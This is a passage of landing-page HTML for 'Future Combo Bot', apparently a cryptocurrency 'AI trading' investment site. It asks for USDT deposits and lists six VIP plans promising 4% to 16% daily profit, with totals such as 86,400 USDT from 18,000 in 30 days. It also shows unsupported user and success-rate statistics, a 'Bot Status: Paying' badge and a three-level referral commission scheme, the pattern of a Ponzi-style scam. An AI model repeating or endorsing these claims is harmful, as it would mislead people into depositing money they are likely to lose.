                            </div>
                            <div class="flex items-start space-x-2">
                                <div class="w-5 h-5 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                                    <span class="text-blue-600 font-bold text-xs">2</span>
                                </div>
                                <div>
                                    <p class="font-medium">Enter Wallet Address</p>
                                    <p class="text-gray-600">Provide your cryptocurrency wallet address for receiving funds</p>
                                </div>
                            </div>
                            <div class="flex items-start space-x-2">
                                <div class="w-5 h-5 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                                    <span class="text-blue-600 font-bold text-xs">3</span>
                                </div>
                                <div>
                                    <p class="font-medium">Specify Amount</p>
                                    <p class="text-gray-600">Enter withdrawal amount (minimum 1 USDT)</p>
                                </div>
                            </div>
                            <div class="flex items-start space-x-2">
                                <div class="w-5 h-5 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                                    <span class="text-blue-600 font-bold text-xs">4</span>
                                </div>
                                <div>
                                    <p class="font-medium">Instant Processing</p>
                                    <p class="text-gray-600">Funds are processed instantly and sent to your wallet</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- About Bot Section -->
    <section id="about-bot" class="py-12 bg-gradient-to-br from-gray-50 to-blue-50">
        <div class="container mx-auto px-4">
            <div class="text-center mb-10 animate-fade-in-up">
                <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-gray-900 border border-gray-200 mb-2">
                    <i data-lucide="bot" class="w-3 h-3 mr-1"></i>
                    About Platform
                </span>
                <h2 class="text-xl md:text-2xl font-bold text-gray-900 mb-3">About Future Combo Bot</h2>
                <p class="text-xs text-gray-600 max-w-3xl mx-auto">
                    Future Combo Bot is your go-to for AI-powered crypto trading. With 33,806 monthly users, we deliver
                    precision, growth, and trust.
                </p>
            </div>

            <div class="grid md:grid-cols-3 gap-5 mb-8">
                <div class="bg-white rounded-xl border shadow-sm text-center hover:shadow-lg transition-all duration-300 hover:scale-105 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6">
                        <i data-lucide="shield" class="h-6 w-6 text-blue-600 mx-auto mb-2"></i>
                        <div class="text-lg font-bold text-gray-900 mb-1">149</div>
                        <div class="text-xs text-gray-600">Safe Operations Days</div>
                    </div>
                </div>
                <div class="bg-white rounded-xl border shadow-sm text-center hover:shadow-lg transition-all duration-300 hover:scale-105 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6">
                        <i data-lucide="dollar-sign" class="h-6 w-6 text-green-600 mx-auto mb-2"></i>
                        <div class="text-lg font-bold text-gray-900 mb-1">14,657,429</div>
                        <div class="text-xs text-gray-600">Cumulative Income USDT</div>
                    </div>
                </div>
                <div class="bg-white rounded-xl border shadow-sm text-center hover:shadow-lg transition-all duration-300 hover:scale-105 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6">
                        <i data-lucide="users" class="h-6 w-6 text-purple-600 mx-auto mb-2"></i>
                        <div class="text-lg font-bold text-gray-900 mb-1">33,806</div>
                        <div class="text-xs text-gray-600">Monthly Users</div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Bot Stats Section -->
    <section class="py-12 bg-white">
        <div class="container mx-auto px-4">
            <div class="text-center mb-10">
                <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-gray-900 border border-gray-200 mb-2">
                    <i data-lucide="bar-chart-3" class="w-3 h-3 mr-1"></i>
                    Performance Stats
                </span>
                <h2 class="text-xl md:text-2xl font-bold text-gray-900 mb-3">Real-Time Bot Statistics</h2>
                <p class="text-xs text-gray-600">Live performance metrics and trading analytics</p>
            </div>

            <div class="max-w-4xl mx-auto">
                <div class="bg-white rounded-xl border shadow-sm p-5 hover:shadow-lg transition-all duration-300">
                    <div class="text-center mb-5">
                        <img src="https://imgdrive.42web.io/uploads/8PDS5.png" alt="Bot Performance Statistics Dashboard" class="mx-auto rounded-lg shadow-lg border border-gray-200 max-w-full h-auto">
                    </div>
                    <div class="text-center">
                        <h3 class="text-base font-bold text-gray-900 mb-2">Live Trading Performance Dashboard</h3>
                        <p class="text-xs text-gray-600 mb-3">
                            Real-time statistics showing active trades, profit margins, success rates, and user engagement metrics
                        </p>
                        <div class="grid md:grid-cols-4 gap-3 text-center">
                            <div class="bg-blue-50 p-2 rounded-lg">
                                <div class="text-base font-bold text-blue-600">87.7%</div>
                                <div class="text-xs text-gray-600">Success Rate</div>
                            </div>
                            <div class="bg-green-50 p-2 rounded-lg">
                                <div class="text-base font-bold text-green-600">24/7</div>
                                <div class="text-xs text-gray-600">Active Trading</div>
                            </div>
                            <div class="bg-purple-50 p-2 rounded-lg">
                                <div class="text-base font-bold text-purple-600">1,143</div>
                                <div class="text-xs text-gray-600">Daily Trades</div>
                            </div>
                            <div class="bg-orange-50 p-2 rounded-lg">
                                <div class="text-base font-bold text-orange-600">25,557</div>
                                <div class="text-xs text-gray-600">Active Users</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- How It Works Section -->
    <section id="how-it-works" class="py-12 bg-gradient-to-br from-gray-50 to-blue-50">
        <div class="container mx-auto px-4">
            <div class="text-center mb-10">
                <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-gray-900 border border-gray-200 mb-2">
                    <i data-lucide="cpu" class="w-3 h-3 mr-1"></i>
                    Process
                </span>
                <h2 class="text-xl md:text-2xl font-bold text-gray-900 mb-3">How It Works</h2>
                <p class="text-xs text-gray-600">Simple steps to start earning with AI-powered trading</p>
            </div>

            <div class="grid md:grid-cols-4 gap-5">
                <div class="bg-white rounded-xl border shadow-sm text-center hover:shadow-lg transition-all duration-300 hover:scale-105 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6">
                        <div class="w-10 h-10 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-3">
                            <i data-lucide="dollar-sign" class="h-5 w-5"></i>
                        </div>
                        <div class="text-base font-bold mb-2">1. Deposit</div>
                        <p class="text-xs text-gray-600">Minimum 30 USDT to start</p>
                    </div>
                </div>
                <div class="bg-white rounded-xl border shadow-sm text-center hover:shadow-lg transition-all duration-300 hover:scale-105 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6">
                        <div class="w-10 h-10 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-3">
                            <i data-lucide="target" class="h-5 w-5"></i>
                        </div>
                        <div class="text-base font-bold mb-2">2. Choose Plan</div>
                        <p class="text-xs text-gray-600">Pick a VIP plan for daily profits</p>
                    </div>
                </div>
                <div class="bg-white rounded-xl border shadow-sm text-center hover:shadow-lg transition-all duration-300 hover:scale-105 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6">
                        <div class="w-10 h-10 bg-purple-100 text-purple-600 rounded-full flex items-center justify-center mx-auto mb-3">
                            <i data-lucide="bot" class="h-5 w-5"></i>
                        </div>
                        <div class="text-base font-bold mb-2">3. Auto-Trade</div>
                        <p class="text-xs text-gray-600">87.7% accuracy with real-time tracking</p>
                    </div>
                </div>
                <div class="bg-white rounded-xl border shadow-sm text-center hover:shadow-lg transition-all duration-300 hover:scale-105 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6">
                        <div class="w-10 h-10 bg-orange-100 text-orange-600 rounded-full flex items-center justify-center mx-auto mb-3">
                            <i data-lucide="trending-up" class="h-5 w-5"></i>
                        </div>
                        <div class="text-base font-bold mb-2">4. Withdraw</div>
                        <p class="text-xs text-gray-600">Instant, min 1 USDT</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Features Section -->
    <section class="py-12 bg-white">
        <div class="container mx-auto px-4">
            <div class="text-center mb-10">
                <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-gray-900 border border-gray-200 mb-2">
                    <i data-lucide="zap" class="w-3 h-3 mr-1"></i>
                    Features
                </span>
                <h2 class="text-xl md:text-2xl font-bold text-gray-900 mb-3">Key Features</h2>
            </div>

            <div class="grid md:grid-cols-2 lg:grid-cols-4 gap-5">
                <div class="bg-white rounded-xl border shadow-sm hover:shadow-lg transition-all duration-300 hover:scale-105 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6">
                        <i data-lucide="bot" class="h-8 w-8 text-blue-600 mb-3"></i>
                        <h3 class="text-base font-bold mb-2">Auto-Trade & Diversify</h3>
                        <p class="text-xs text-gray-600">Effortless trading with portfolio variety</p>
                    </div>
                </div>
                <div class="bg-white rounded-xl border shadow-sm hover:shadow-lg transition-all duration-300 hover:scale-105 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6">
                        <i data-lucide="shield" class="h-8 w-8 text-green-600 mb-3"></i>
                        <h3 class="text-base font-bold mb-2">Smart Risk Management</h3>
                        <p class="text-xs text-gray-600">Minimize losses with AI algorithms</p>
                    </div>
                </div>
                <div class="bg-white rounded-xl border shadow-sm hover:shadow-lg transition-all duration-300 hover:scale-105 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6">
                        <i data-lucide="bar-chart-3" class="h-8 w-8 text-purple-600 mb-3"></i>
                        <h3 class="text-base font-bold mb-2">Live Performance Tracking</h3>
                        <p class="text-xs text-gray-600">Updates every 5 minutes</p>
                    </div>
                </div>
                <div class="bg-white rounded-xl border shadow-sm hover:shadow-lg transition-all duration-300 hover:scale-105 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6">
                        <i data-lucide="book-open" class="h-8 w-8 text-orange-600 mb-3"></i>
                        <h3 class="text-base font-bold mb-2">Bot User Guide</h3>
                        <p class="text-xs text-gray-600">Easy onboarding for all users</p>
                    </div>
                </div>
            </div>

            <div class="mt-8 text-center">
                <div class="grid md:grid-cols-3 gap-3 max-w-2xl mx-auto">
                    <span class="inline-flex items-center px-2 py-2 rounded-md text-xs font-medium bg-green-50 text-green-700 border border-green-200">
                        <i data-lucide="check-circle" class="w-3 h-3 mr-1"></i>
                        Bot Status: Paying
                    </span>
                    <span class="inline-flex items-center px-2 py-2 rounded-md text-xs font-medium bg-blue-50 text-blue-700 border border-blue-200">
                        <i data-lucide="dollar-sign" class="w-3 h-3 mr-1"></i>
                        Min Investment: 30 USDT
                    </span>
                    <span class="inline-flex items-center px-2 py-2 rounded-md text-xs font-medium bg-purple-50 text-purple-700 border border-purple-200">
                        <i data-lucide="activity" class="w-3 h-3 mr-1"></i>
                        Min Deposit/Withdraw: 1 USDT
                    </span>
                </div>
            </div>
        </div>
    </section>

    <!-- VIP Plans Intro Image -->
    <section class="py-8 bg-gradient-to-br from-blue-50 to-indigo-100">
        <div class="container mx-auto px-4">
            <div class="text-center">
                <img src="https://imgdrive.42web.io/uploads/VL9Wv.jpeg" alt="VIP Investment Plans Overview" class="mx-auto rounded-lg shadow-lg border border-gray-200 hover:shadow-xl transition-all duration-500 max-w-full h-auto">
                <p class="text-xs text-gray-600 mt-3 italic">
                    Choose from 6 VIP investment levels designed for different investment capacities
                </p>
            </div>
        </div>
    </section>

    <!-- VIP Plans Section -->
    <section id="vip-plans" class="py-12 bg-gradient-to-br from-blue-50 to-indigo-100">
        <div class="container mx-auto px-4">
            <div class="text-center mb-10">
                <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-gray-900 border border-gray-200 mb-2">
                    <i data-lucide="crown" class="w-3 h-3 mr-1"></i>
                    Investment Plans
                </span>
                <h2 class="text-xl md:text-2xl font-bold text-gray-900 mb-3">
                    VIP Plans: Earn Daily Passive Income with 100% Transparency
                </h2>
                <p class="text-xs text-gray-600">Choose your investment level and start earning immediately</p>
            </div>

            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-5">
                <!-- VIP 1 -->
                <div class="bg-gradient-to-br from-amber-50 to-amber-100 border-2 border-amber-200 rounded-xl shadow-sm hover:shadow-xl transition-all duration-500 hover:scale-105 animate-fade-in-up">
                    <div class="text-center pb-3 px-6 pt-6">
                        <div class="w-10 h-10 bg-amber-50 rounded-full flex items-center justify-center mx-auto mb-2 animate-pulse">
                            <i data-lucide="award" class="h-5 w-5 text-amber-600"></i>
                        </div>
                        <h3 class="text-base font-bold">VIP 1 – Starter Plan</h3>
                    </div>
                    <div class="px-6 pb-6 space-y-2">
                        <div class="space-y-1 text-xs">
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="dollar-sign" class="w-3 h-3 mr-1"></i>
                                    Investment:
                                </span>
                                <span class="font-bold">30 USDT</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="trending-up" class="w-3 h-3 mr-1"></i>
                                    Daily Profit:
                                </span>
                                <span class="font-bold text-green-600">1.2 USDT (~4%)</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="clock" class="w-3 h-3 mr-1"></i>
                                    Duration:
                                </span>
                                <span class="font-bold">4 Months (120 Days)</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="pie-chart" class="w-3 h-3 mr-1"></i>
                                    Total Earnings:
                                </span>
                                <span class="font-bold text-blue-600">144 USDT</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="check-circle" class="w-3 h-3 mr-1"></i>
                                    Max Buy:
                                </span>
                                <span class="font-bold">2 Times</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="bot" class="w-3 h-3 mr-1"></i>
                                    Bot Commission:
                                </span>
                                <span class="font-bold">30% on Profits</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- VIP 2 -->
                <div class="bg-gradient-to-br from-gray-50 to-gray-100 border-2 border-gray-200 rounded-xl shadow-sm hover:shadow-xl transition-all duration-500 hover:scale-105 animate-fade-in-up">
                    <div class="text-center pb-3 px-6 pt-6">
                        <div class="w-10 h-10 bg-gray-50 rounded-full flex items-center justify-center mx-auto mb-2 animate-pulse">
                            <i data-lucide="target" class="h-5 w-5 text-gray-600"></i>
                        </div>
                        <h3 class="text-base font-bold">VIP 2 – Grow Steady</h3>
                    </div>
                    <div class="px-6 pb-6 space-y-2">
                        <div class="space-y-1 text-xs">
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="dollar-sign" class="w-3 h-3 mr-1"></i>
                                    Investment:
                                </span>
                                <span class="font-bold">150 USDT</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="trending-up" class="w-3 h-3 mr-1"></i>
                                    Daily Profit:
                                </span>
                                <span class="font-bold text-green-600">7.5 USDT (~5%)</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="clock" class="w-3 h-3 mr-1"></i>
                                    Duration:
                                </span>
                                <span class="font-bold">4 Months (120 Days)</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="pie-chart" class="w-3 h-3 mr-1"></i>
                                    Total Earnings:
                                </span>
                                <span class="font-bold text-blue-600">900 USDT</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="check-circle" class="w-3 h-3 mr-1"></i>
                                    Max Buy:
                                </span>
                                <span class="font-bold">2 Times</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="bot" class="w-3 h-3 mr-1"></i>
                                    Bot Commission:
                                </span>
                                <span class="font-bold">30% on Profits</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- VIP 3 -->
                <div class="bg-gradient-to-br from-yellow-50 to-yellow-100 border-2 border-yellow-200 rounded-xl shadow-sm hover:shadow-xl transition-all duration-500 hover:scale-105 animate-fade-in-up">
                    <div class="text-center pb-3 px-6 pt-6">
                        <div class="w-10 h-10 bg-yellow-50 rounded-full flex items-center justify-center mx-auto mb-2 animate-pulse">
                            <i data-lucide="star" class="h-5 w-5 text-yellow-600"></i>
                        </div>
                        <h3 class="text-base font-bold">VIP 3 – High Return</h3>
                    </div>
                    <div class="px-6 pb-6 space-y-2">
                        <div class="space-y-1 text-xs">
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="dollar-sign" class="w-3 h-3 mr-1"></i>
                                    Investment:
                                </span>
                                <span class="font-bold">600 USDT</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="trending-up" class="w-3 h-3 mr-1"></i>
                                    Daily Profit:
                                </span>
                                <span class="font-bold text-green-600">39.0 USDT (~6.5%)</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="clock" class="w-3 h-3 mr-1"></i>
                                    Duration:
                                </span>
                                <span class="font-bold">4 Months (120 Days)</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="pie-chart" class="w-3 h-3 mr-1"></i>
                                    Total Earnings:
                                </span>
                                <span class="font-bold text-blue-600">4,680 USDT</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="check-circle" class="w-3 h-3 mr-1"></i>
                                    Max Buy:
                                </span>
                                <span class="font-bold">3 Times</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="bot" class="w-3 h-3 mr-1"></i>
                                    Bot Commission:
                                </span>
                                <span class="font-bold">20% on Profits</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- VIP 4 -->
                <div class="bg-gradient-to-br from-blue-50 to-blue-100 border-2 border-blue-200 rounded-xl shadow-sm hover:shadow-xl transition-all duration-500 hover:scale-105 animate-fade-in-up">
                    <div class="text-center pb-3 px-6 pt-6">
                        <div class="w-10 h-10 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-2 animate-pulse">
                            <i data-lucide="diamond" class="h-5 w-5 text-blue-600"></i>
                        </div>
                        <h3 class="text-base font-bold">VIP 4 – Ultimate Profits</h3>
                    </div>
                    <div class="px-6 pb-6 space-y-2">
                        <div class="space-y-1 text-xs">
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="dollar-sign" class="w-3 h-3 mr-1"></i>
                                    Investment:
                                </span>
                                <span class="font-bold">3000 USDT</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="trending-up" class="w-3 h-3 mr-1"></i>
                                    Daily Profit:
                                </span>
                                <span class="font-bold text-green-600">270.0 USDT (~9%)</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="clock" class="w-3 h-3 mr-1"></i>
                                    Duration:
                                </span>
                                <span class="font-bold">4 Months (120 Days)</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="pie-chart" class="w-3 h-3 mr-1"></i>
                                    Total Earnings:
                                </span>
                                <span class="font-bold text-blue-600">32,400 USDT</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="check-circle" class="w-3 h-3 mr-1"></i>
                                    Max Buy:
                                </span>
                                <span class="font-bold">3 Times</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="bot" class="w-3 h-3 mr-1"></i>
                                    Bot Commission:
                                </span>
                                <span class="font-bold">10% on Profits</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- VIP 5 -->
                <div class="bg-gradient-to-br from-purple-50 to-purple-100 border-2 border-purple-200 rounded-xl shadow-sm hover:shadow-xl transition-all duration-500 hover:scale-105 animate-fade-in-up">
                    <div class="text-center pb-3 px-6 pt-6">
                        <div class="w-10 h-10 bg-purple-50 rounded-full flex items-center justify-center mx-auto mb-2 animate-pulse">
                            <i data-lucide="crown" class="h-5 w-5 text-purple-600"></i>
                        </div>
                        <h3 class="text-base font-bold">VIP 5 – Elite Max Profit</h3>
                    </div>
                    <div class="px-6 pb-6 space-y-2">
                        <div class="space-y-1 text-xs">
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="dollar-sign" class="w-3 h-3 mr-1"></i>
                                    Investment:
                                </span>
                                <span class="font-bold">8000 USDT</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="trending-up" class="w-3 h-3 mr-1"></i>
                                    Daily Profit:
                                </span>
                                <span class="font-bold text-green-600">960.0 USDT (~12%)</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="clock" class="w-3 h-3 mr-1"></i>
                                    Duration:
                                </span>
                                <span class="font-bold">2 Months (60 Days)</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="pie-chart" class="w-3 h-3 mr-1"></i>
                                    Total Earnings:
                                </span>
                                <span class="font-bold text-blue-600">57,600 USDT</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="check-circle" class="w-3 h-3 mr-1"></i>
                                    Max Buy:
                                </span>
                                <span class="font-bold">2 Times</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="bot" class="w-3 h-3 mr-1"></i>
                                    Bot Commission:
                                </span>
                                <span class="font-bold">5% on Profits</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- VIP 6 -->
                <div class="bg-gradient-to-br from-emerald-50 to-emerald-100 border-2 border-emerald-200 rounded-xl shadow-sm hover:shadow-xl transition-all duration-500 hover:scale-105 animate-fade-in-up">
                    <div class="text-center pb-3 px-6 pt-6">
                        <div class="w-10 h-10 bg-emerald-50 rounded-full flex items-center justify-center mx-auto mb-2 animate-pulse">
                            <i data-lucide="rocket" class="h-5 w-5 text-emerald-600"></i>
                        </div>
                        <h3 class="text-base font-bold">VIP 6 – Hyperion Wealth</h3>
                    </div>
                    <div class="px-6 pb-6 space-y-2">
                        <div class="space-y-1 text-xs">
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="dollar-sign" class="w-3 h-3 mr-1"></i>
                                    Investment:
                                </span>
                                <span class="font-bold">18000 USDT</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="trending-up" class="w-3 h-3 mr-1"></i>
                                    Daily Profit:
                                </span>
                                <span class="font-bold text-green-600">2880.0 USDT (~16%)</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="clock" class="w-3 h-3 mr-1"></i>
                                    Duration:
                                </span>
                                <span class="font-bold">1 Month (30 Days)</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="pie-chart" class="w-3 h-3 mr-1"></i>
                                    Total Earnings:
                                </span>
                                <span class="font-bold text-blue-600">86,400 USDT</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="check-circle" class="w-3 h-3 mr-1"></i>
                                    Max Buy:
                                </span>
                                <span class="font-bold">1 Times</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600 flex items-center">
                                    <i data-lucide="bot" class="w-3 h-3 mr-1"></i>
                                    Bot Commission:
                                </span>
                                <span class="font-bold">1% on Profits</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="text-center mt-8">
                <p class="text-sm font-bold text-gray-900">Pick Your Plan & Start Earning Instantly!</p>
            </div>
        </div>
    </section>

    <!-- Investment Success Image -->
    <section class="py-8 bg-white">
        <div class="container mx-auto px-4">
            <div class="text-center">
                <img src="https://imgdrive.42web.io/uploads/xfogv.png" alt="Investment Success Stories" class="mx-auto rounded-lg shadow-lg border border-gray-200 hover:shadow-xl transition-all duration-500 max-w-full h-auto">
                <p class="text-xs text-gray-600 mt-3 italic">
                    Real success stories from our VIP plan investors showing consistent daily profits
                </p>
            </div>
        </div>
    </section>

    <!-- Referral Stats Image -->
    <section class="py-8 bg-gradient-to-br from-gray-50 to-blue-50">
        <div class="container mx-auto px-4">
            <div class="text-center">
                <img src="https://imgdrive.42web.io/uploads/AfCVq.png" alt="Referral Program Statistics" class="mx-auto rounded-lg shadow-lg border-2 border-gray-200 hover:shadow-xl transition-all duration-500 max-w-full h-auto">
                <p class="text-xs text-gray-600 mt-3 italic">
                    Real-time referral program statistics showing commission earnings and team performance
                </p>
            </div>
        </div>
    </section>

    <!-- Referral System Section -->
    <section id="referrals" class="py-12 bg-gradient-to-br from-gray-50 to-blue-50">
        <div class="container mx-auto px-4">
            <div class="text-center mb-10">
                <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-gray-900 border border-gray-200 mb-2">
                    <i data-lucide="users" class="w-3 h-3 mr-1"></i>
                    Referral Program
                </span>
                <h2 class="text-xl md:text-2xl font-bold text-gray-900 mb-3">Build Your Team, Stack Your Earnings</h2>
                <p class="text-xs text-gray-600">3-Level Referral System with Generous Commissions</p>
            </div>

            <div class="grid md:grid-cols-3 gap-5 mb-8">
                <div class="bg-white rounded-xl border shadow-sm text-center hover:scale-105 transition-all duration-300 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6">
                        <div class="w-10 h-10 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-3">
                            <i data-lucide="users" class="h-5 w-5 text-green-600"></i>
                        </div>
                        <h3 class="text-base font-bold mb-2">Level 1 (A)</h3>
                        <div class="text-xl font-bold text-green-600 mb-2">8%</div>
                        <p class="text-xs text-gray-600">80 USDT on 1,000 USDT deposit</p>
                    </div>
                </div>
                <div class="bg-white rounded-xl border shadow-sm text-center hover:scale-105 transition-all duration-300 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6">
                        <div class="w-10 h-10 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-3">
                            <i data-lucide="users" class="h-5 w-5 text-blue-600"></i>
                        </div>
                        <h3 class="text-base font-bold mb-2">Level 2 (B)</h3>
                        <div class="text-xl font-bold text-blue-600 mb-2">3%</div>
                        <p class="text-xs text-gray-600">30 USDT on 1,000 USDT deposit</p>
                    </div>
                </div>
                <div class="bg-white rounded-xl border shadow-sm text-center hover:scale-105 transition-all duration-300 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6">
                        <div class="w-10 h-10 bg-purple-50 rounded-full flex items-center justify-center mx-auto mb-3">
                            <i data-lucide="users" class="h-5 w-5 text-purple-600"></i>
                        </div>
                        <h3 class="text-base font-bold mb-2">Level 3 (C)</h3>
                        <div class="text-xl font-bold text-purple-600 mb-2">1%</div>
                        <p class="text-xs text-gray-600">10 USDT on 1,000 USDT deposit</p>
                    </div>
                </div>
            </div>

            <!-- Referral System Image -->
            <div class="text-center mb-8">
                <img src="https://imgdrive.42web.io/uploads/qn9L4.png" alt="3-Level Referral System" class="mx-auto rounded-lg shadow-lg border border-gray-200 hover:shadow-xl transition-all duration-500 max-w-full h-auto">
                <div class="bg-white rounded-xl border shadow-sm max-w-2xl mx-auto mt-5 p-4">
                    <h4 class="font-bold text-base mb-3 flex items-center justify-center">
                        <i data-lucide="users" class="h-4 w-4 mr-2 text-blue-600"></i>
                        3-Level Referral System
                    </h4>
                    <div class="space-y-2 text-xs">
                        <div class="flex items-center space-x-2">
                            <div class="w-3 h-3 bg-green-500 rounded-full"></div>
                            <span>A-Level: 8%</span>
                        </div>
                        <div class="flex items-center space-x-2">
                            <div class="w-3 h-3 bg-blue-500 rounded-full"></div>
                            <span>B-Level: 3%</span>
                        </div>
                        <div class="flex items-center space-x-2">
                            <div class="w-3 h-3 bg-purple-500 rounded-full"></div>
                            <span>C-Level: 1%</span>
                        </div>
                        <p class="text-gray-600 mt-3">
                            Paid instantly on every team deposit, for lifetime - no conditions.
                        </p>
                        <div class="space-y-1 mt-3">
                            <p class="flex items-center">
                                <i data-lucide="check-circle" class="w-3 h-3 text-green-500 mr-1"></i>
                                A-level team 8%, the other party deposits 1,000 USDT, you get 80 USDT
                            </p>
                            <p class="flex items-center">
                                <i data-lucide="dollar-sign" class="w-3 h-3 text-blue-500 mr-1"></i>
                                B-level team 3%, the other party deposits 1000 USDT, you get 30 USDT
                            </p>
                            <p class="flex items-center">
                                <i data-lucide="star" class="w-3 h-3 text-purple-500 mr-1"></i>
                                C-level team 1%, the other party deposits 1000 USDT, you get 10 USDT
                            </p>
                        </div>
                    </div>
                </div>
            </div>

            <div class="bg-white rounded-xl border shadow-sm max-w-2xl mx-auto hover:shadow-lg transition-all duration-300">
                <div class="px-6 pt-6 pb-3">
                    <h3 class="text-center flex items-center justify-center text-base font-bold">
                        <i data-lucide="bar-chart-3" class="mr-2 h-4 w-4"></i>
                        Demo Referral Stats for reference 
                    </h3>
                </div>
                <div class="px-6 pb-6">
                    <div class="grid grid-cols-2 gap-3 text-center mb-5">
                        <div>
                            <div class="text-lg font-bold text-blue-600">3</div>
                            <div class="text-xs text-gray-600">Total Referrals</div>
                        </div>
                        <div>
                            <div class="text-lg font-bold text-green-600">4,600</div>
                            <div class="text-xs text-gray-600">Deposits USDT</div>
                        </div>
                        <div>
                            <div class="text-lg font-bold text-purple-600">318</div>
                            <div class="text-xs text-gray-600">Earnings USDT</div>
                        </div>
                        <div>
